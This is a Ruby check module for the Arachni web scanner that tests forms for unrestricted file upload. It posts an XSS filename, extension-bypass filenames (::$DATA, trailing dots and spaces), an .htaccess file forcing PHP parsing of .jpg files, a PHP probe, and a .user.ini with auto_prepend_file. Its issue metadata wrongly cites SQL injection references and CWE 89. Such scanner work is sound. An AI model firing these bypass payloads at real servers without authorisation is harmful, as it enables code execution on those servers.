#encoding:utf-8

class Arachni::Checks::UnrestrictedFileUpload < Arachni::Check::Base

  def check_function_upload1(page_link,sig1,res_after_upload,link,filename,first_filename,sig_md5)
    #and page_link.response.headers['content-type'].include?("text/html")
    proof_nodes = Arachni::Parser.parse(
        page_link.body,
        ).nodes_by_attribute_name_and_value( "onerror",sig1 )
    url_extension = page_link.parsed_url.resource_extension
    if !url_extension.nil?
      url_downcase = url_extension.downcase
      if !proof_nodes.empty? and (url_downcase.include?("htm") || url_downcase.include?("php") )
        detail = false
        if !first_filename
        detail = %q{Successfully uploaded file named %s ;
      The file is available at: %s;
      The signature is %s.
      } % [filename,link,sig1]
        elsif first_filename == ".htaccess" and page_link.body.include?(sig_md5)
          detail = %q{Step1,set up PHP parsing by uploading %s;
      Step2,upload file name %s,
      The file is available at: %s;
      The signature is %s.
      } % [first_filename,filename,link,sig1]
        end
        if detail
          # print_debug "detail:#{detail}"
          log(
              # vector: Element::Path.new( res_after_upload.url ),
              vector: Element::Body.new( res_after_upload.url ).tap { |b| b.auditor = self },
              proof: detail,
              response: res_after_upload,
              )
          log(
              # vector: Element::Path.new( res_after_upload.url ),
              vector: Element::Body.new( res_after_upload.url ).tap { |b| b.auditor = self },
              proof: detail,
              response: res_after_upload,
              )
          return true
        else
          return false
        end
      end
      end
    return false
  end

  def deal_link(link)
    if link.include?("::$data") || link.include?("::$DATA")
      return link.gsub(/(::\$DATA)|(::\$data)/,"")
    end
    return link
  end

  def check_function_upload_userini(res_link,sig_userini,res_after_upload_userini,link,file_name_userini)
    detail =  %q{Successfully uploaded file named %s }% file_name_userini
    if res_link.body.include?("auto_prepend_file=hack2.jpg")
      log(
          # vector: Element::Path.new( res_after_upload_userini.url ),
          vector: Element::Body.new( res_after_upload_userini.url ).tap { |b| b.auditor = self },
          proof: detail,
          response: res_after_upload_userini,
          )
      return true
    else
      return false
    end
  end

  def check_filename_xss(res,sig,file_name)
    proof_nodes = Arachni::Parser.parse(
        res.body,
        ).nodes_by_attribute_name_and_value( "onerror",sig )
    if !proof_nodes.empty?
      detail = %q{Uploaded file named %s .
    The filename %s create xss.
  The signature is %s.
    } % [file_name,file_name,sig]
      log(
          # vector: Element::Path.new( res.url ),
          vector: Element::Body.new( res.url ).tap { |b| b.auditor = self },
          proof: detail,
          response: res,
          )
    end
  end

  def run
    return if audited?(page.url)
    rand_ = rand(10000).to_s
    # rand_ = 4430.to_s
    rand_seed = "TtTestForFileUpload#{rand_}"
    # 1、构造恶意文件名进行上传导致xss
    file_name_xss = '<img src=1 onerror=alert(%s)>'%rand_

    #2、、构造文件名进行绕过，单次上传
    filename_ele = "tt_hack_#{rand_}"
    sig_md5_ = Digest::MD5.hexdigest(rand_)
    sig1 = "alert(%s)"%rand_
    upload_filename_list = [".htm",".PHP",".pHP",".htm ",".php ",".php.",".htm.",".htm::$DATA",".php::$DATA",".htm. .",".php. .",".pphphp"].map{|e| filename_ele + e}
    # upload_filename_list = [".png"]

    page.forms.each do |form|
      submit_name = ""
      submit_value = ""
      submit_url = ""
      file_input_name = ""
      headers = ""
      continue_upload_sig = true     #上传成功后则停止上传
      form.inputs.keys.each do |name|
        if form.details_for( name )[:type] == :submit
          submit_name = name
          submit_value = form.details_for( name )[:value]
        end
        if form.details_for( name )[:type] == :file
          # puts name,form.action
          file_input_name = name
          headers = page.request.headers
          headers["Host"] = page.parsed_url.domain
          headers["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundary1UAWQaWkCBnhZe5L"
          submit_url = form.action
        end
        next if submit_name.empty? or submit_value.empty? or submit_url.empty? or file_input_name.empty?
      end
      next if submit_name.empty? or submit_value.empty? or submit_url.empty? or file_input_name.empty?

      # upload1、构造恶意文件名上传导致xss
      para_filename_xss = %q{------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"; filename="%s"
Content-Type: image/jpeg

<img src=1 onerror=alert(%s)>

------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"

%s
------WebKitFormBoundary1UAWQaWkCBnhZe5L--}% [file_input_name,file_name_xss,rand_,submit_name,submit_value]
      res_after_upload_filenamexss = http.post(url=submit_url,
                                   parameters:para_filename_xss,
                                   headers:headers ,
                                   mode: :sync )
      check_filename_xss(res_after_upload_filenamexss,sig1,file_name_xss)


    #  upload2 :通过构造文件名进行单次上传绕过
      upload_filename_list.each do |filename|
        para =  %q{------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"; filename="%s"
Content-Type: image/jpeg

<img src=1 onerror=alert(%s)>

------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"

%s
------WebKitFormBoundary1UAWQaWkCBnhZe5L--}% [file_input_name,filename,rand_,submit_name,submit_value]
        if continue_upload_sig
          res_after_upload = http.post(url=submit_url,
                          parameters:para,
                          headers:headers ,
                          mode: :sync )
          # print_debug "upload_res:#{res_after_upload.body}"
          page_after_upload = res_after_upload.to_page
          # print_debug "upload_res_paths:#{page_after_upload.paths.to_s}"
          page_after_upload.paths.each do |link|
            link = deal_link(link)
            res_link = http.get(link,mode: :sync)
            # print_debug "res_link:#{res_link.body}"
            page_link = res_link.to_page
            if check_function_upload1(page_link,sig1,res_after_upload,link,filename,first_filename=false,sig_md5=sig_md5_)
              continue_upload_sig = false
              break
            end
          end
        end
      end

    #  upload3-1: 二次上传   通过先上传.htacess 文件,修改文件的解析方式，再进行二次上传
      if continue_upload_sig
        para_htacess =%q{------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"; filename="%s"
Content-Type: image/jpeg

<FilesMatch  *.jpg>
	SetHandler application/x-httpd-php
</FilesMatch>

------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"

%s
------WebKitFormBoundary1UAWQaWkCBnhZe5L--}%[file_input_name,".htaccess",submit_name,submit_value]
        file_name_htacess_jpg = filename_ele+".jpg"
        para_htacess_jpg = %q{------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"; filename="%s"
Content-Type: image/jpeg

<img src=1 onerror=alert(%s)>
<?php echo md5(%s); ?>

------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"

%s
------WebKitFormBoundary1UAWQaWkCBnhZe5L--}% [file_input_name,file_name_htacess_jpg,rand_,rand_,submit_name,submit_value]
        #上传.htacess文件
        res_after_upload_htacess1 = http.post(url=submit_url,
                                              parameters:para_htacess,
                                              headers:headers ,
                                              mode: :sync )
        #上传恶意jpg文件
        res_after_upload_htacess2 = http.post(url=submit_url,
                                              parameters:para_htacess_jpg,
                                              headers:headers ,
                                              mode: :sync )
        page_after_upload_htacess2 = res_after_upload_htacess2.to_page
        page_after_upload_htacess2.paths.each do |link|
          link = deal_link(link)
          res_link = http.get(link,mode: :sync)
          page_link = res_link.to_page
          if check_function_upload1(page_link,sig1,res_after_upload_htacess2,link,file_name_htacess_jpg,first_filename=".htaccess",sig_md5=sig_md5_)
            continue_upload_sig = false
            break
          end
        end
      end

      #  upload3-2: 二次上传   通过先上传.user.ini 文件,修设置php文件的任意包含，再进行二次上传.只检测是否成功上传user.init文件
      if continue_upload_sig
        file_name_userini = ".user.ini"
        sig_userini = "auto_prepend_file=hack2.jpg"
        para_userini =%q{------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"; filename="%s"
Content-Type: image/jpeg

auto_prepend_file=hack2.jpg

------WebKitFormBoundary1UAWQaWkCBnhZe5L
Content-Disposition: form-data; name="%s"

%s
------WebKitFormBoundary1UAWQaWkCBnhZe5L--}%[file_input_name,".user.ini",submit_name,submit_value]
        #上传.user.ini文件
        res_after_upload_userini = http.post(url=submit_url,
                                              parameters:para_userini,
                                              headers:headers ,
                                              mode: :sync )
        page_after_upload_userini = res_after_upload_userini.to_page
        page_after_upload_userini.paths.each do |link|
          link = deal_link(link)
          res_link = http.get(link,mode: :sync)
          if check_function_upload_userini(res_link,sig_userini,res_after_upload_userini,link,file_name_userini)
            continue_upload_sig = false
            break
          end
        end
        end

    end

    audited(page.url)
  end



  def self.info
    {
        name:        'UnrestrictedFileUpload',
        description: %q{

},
        elements:    [Element::Form],
        author:      'tomator01',
        version:     '',

        issue:       {
            name:            %q{UnrestrictedFileUpload},
            description:     %q{

},
            references:  {
                'OWASP'         => 'https://www.owasp.org/index.php/Blind_SQL_Injection',
                'MITRE - CAPEC' => 'http://capec.mitre.org/data/definitions/7.html',
                'WASC'          => 'http://projects.webappsec.org/w/page/13246963/SQL%20Injection',
                'W3 Schools'    => 'http://www.w3schools.com/sql/sql_injection_test.asp'
            },
            tags:            %w(UnrestrictedFileUpload),
            cwe:             89,
            severity:        Severity::HIGH,
            remedy_guidance: %q{

}
        }
    }
  end


end
